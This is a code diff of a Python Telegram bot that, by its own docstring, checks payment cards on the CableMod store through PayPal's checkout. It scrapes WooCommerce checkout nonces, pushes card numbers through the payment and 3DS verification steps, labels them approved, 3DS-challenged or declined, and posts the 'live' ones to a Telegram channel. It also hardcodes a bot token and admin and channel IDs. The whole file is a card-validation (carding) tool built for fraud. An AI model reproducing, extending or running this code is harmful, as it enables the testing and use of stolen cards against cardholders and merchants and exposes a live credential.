@@ -1,3 +1,8 @@
+# -*- coding: utf-8 -*-
+"""
+CableMod + PayPal PPCP - Telegram Bot
+بوت تليجرام كامل لفحص البطاقات على موقع CableMod
+"""
 
 import os
 import re
@@ -15,8 +20,8 @@ from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQu
 
 # ====== إعدادات البوت ======
 BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
-ADMIN_IDS = [5895491379, 844663875]  # معرفات الأدمن
-CHANNEL_ID = -1003154179190  # معرف القناة
+ADMIN_IDS = [5895491379, 844663875]
+CHANNEL_ID = -1003154179190
 
 # ====== إعدادات الموقع ======
 BASE_URL = "https://store.cablemod.com/"
@@ -111,16 +116,15 @@ def find(text: str, pattern: str, flags=re.S) -> Optional[str]:
 def extract_nonces(html: str) -> Dict[str, Optional[str]]:
     nonces = {}
     nonces["update_order_review_nonce"] = (
-        find(html, r'id=["\']wc_update_order_review_nonce["\']\s+name=["\']wc_update_order_review_nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
-        or find(html, r'name=["\']wc_update_order_review_nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
+        find(html, r'name=["\']update_order_review_nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
+        or find(html, r'update_order_review_nonce["\']\s*:\s*["\']([a-f0-9]+)["\']', re.I)
     )
-    
     nonces["process_checkout_nonce"] = (
         find(html, r'id=["\']woocommerce-process-checkout-nonce["\']\s+name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
         or find(html, r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
     )
     nonces["ppcp_nonce"] = (
-        find(html, r'"data_client_id"\s* :\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
+        find(html, r'"data_client_id"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
         or find(html, r'"ppcp[^"]*data_client_id[^"]*"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
     )
     nonces["create_order_nonce"] = (
@@ -467,10 +471,10 @@ class WooCommercePayPal:
         status = res.get("threeDSStatus", "UNKNOWN")
         auth_flow = res.get("authFlow", "UNKNOWN")
         liability = res.get("liability_shift", "NO")
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] ✓ 3DS Status: {status}")
+        print(f"[{datetime.now().strftime('%H:%M:%S')}] 3DS Status: {status}")
         if status == "SUCCESS":
-            print(f"[{datetime.now().strftime('%H:%M:%S')}] ✓ Auth Flow: FRICTIONLESS")
-            print(f"[{datetime.now().strftime('%H:%M:%S')}] ✓ Liability Shift: POSSIBLE")
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] Auth Flow: FRICTIONLESS")
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] Liability Shift: POSSIBLE")
         return res
 
 # ====== فحص البطاقة ======
@@ -499,9 +503,9 @@ async def check_card(card: str, bot_app):
             return card, "APPROVED", "Success"
         elif status == "PAYER_ACTION_REQUIRED":
             await asyncio.sleep(0.5)
-            verification_result = processor.step6_3ds_verification()
-            status_3ds = verification_result.get("threeDSStatus", "UNKNOWN")
-            liability = verification_result.get("liability_shift", "NO")
+            lookup_result = processor.step6_3ds_verification()
+            status_3ds = lookup_result.get("threeDSStatus")  # CHALLENGE_REQUIRED, DECLINED, SUCCESS
+            liability = lookup_result.get("liability_shift", "NO")
             if status_3ds == "SUCCESS" and liability == "POSSIBLE":
                 stats['approved'] += 1
                 stats['checking'] -= 1
@@ -510,6 +514,21 @@ async def check_card(card: str, bot_app):
                 await update_dashboard(bot_app)
                 await send_to_channel(bot_app, card, "APPROVED", "Approved")
                 return card, "APPROVED", "Success"
+            elif status_3ds == "CHALLENGE_REQUIRED":
+                stats['secure_3d'] += 1
+                stats['checking'] -= 1
+                stats['last_response'] = '3D CHALLENGE'
+                stats['3ds_cards'].append(card)
+                await update_dashboard(bot_app)
+                await send_to_channel(bot_app, card, "3D_SECURE", "CHALLENGE_REQUIRED")
+                return card, "3D_SECURE", "CHALLENGE_REQUIRED"
+            elif status_3ds == "DECLINED":
+                stats['rejected'] += 1
+                stats['checking'] -= 1
+                stats['last_response'] = 'DECLINED'
+                stats['declined_cards'].append(card)
+                await update_dashboard(bot_app)
+                return card, "DECLINED", "DECLINED"
             else:
                 stats['secure_3d'] += 1
                 stats['checking'] -= 1
@@ -540,28 +559,24 @@ async def send_to_channel(bot_app, card, status_type, message):
         card_number = stats['approved'] + stats['secure_3d']
         if status_type == 'APPROVED':
             text = (
-                "╔═══════════════════╗\n"
-                "APPROVED CARD LIVE\n"
-                "╚═══════════════════╝\n\n"
+                "APPROVED CARD LIVE\n\n"
                 f"`{card}`\n"
                 f"Status: **Approved**\n"
                 f"Card #{card_number}\n"
                 f"Gateway: **CableMod + PayPal**\n"
-                f"Mahmoud Saad\n"
-                "╚═══════════════════╝"
+                f"Mahmoud Saad"
             )
-        else:
+        elif status_type == "3D_SECURE":
             text = (
-                "╔═══════════════════╗\n"
-                "3D SECURE CARD\n"
-                "╚═══════════════════╝\n\n"
+                "3D SECURE CARD\n\n"
                 f"`{card}`\n"
-                f"Status: **3D Secure**\n"
+                f"Status: **{message}**\n"
                 f"Card #{card_number}\n"
                 f"Gateway: **CableMod + PayPal**\n"
-                f"Mahmoud Saad\n"
-                "╚═══════════════════╝"
+                f"Mahmoud Saad"
             )
+        else:
+            return
         await bot_app.bot.send_message(
             chat_id=CHANNEL_ID,
             text=text,
@@ -668,15 +683,12 @@ async def process_cards(cards, bot_app):
             await update_dashboard(bot_app)
         await asyncio.sleep(2)
     stats['is_running'] = False
-    rendez-vous  
     stats['checking'] = 0
     stats['current_card'] = ''
     stats['last_response'] = 'Completed'
     await update_dashboard(bot_app)
     summary_text = (
-        "═══════════════════\n"
-        "**اكتمل الفحص!**\n"
-        "═══════════════════\n\n"
+        "**اكتمل الفحص!**\n\n"
         f"**الإحصائيات النهائية:**\n"
         f"الإجمالي: {stats['total']}\n"
         f"Approved: {stats['approved']}\n"
@@ -692,9 +704,7 @@ async def process_cards(cards, bot_app):
     )
     await send_final_files(bot_app)
     final_text = (
-        "╔═══════════════════╗\n"
-        "**تم إنهاء العملية بنجاح!**\n"
-        "╚═══════════════════╝\n\n"
+        "**تم إنهاء العملية بنجاح!**\n\n"
         "تم إرسال جميع الملفات\n"
         "شكراً لاستخدامك البوت!\n\n"
         "Gateway: CableMod + PayPal\n"
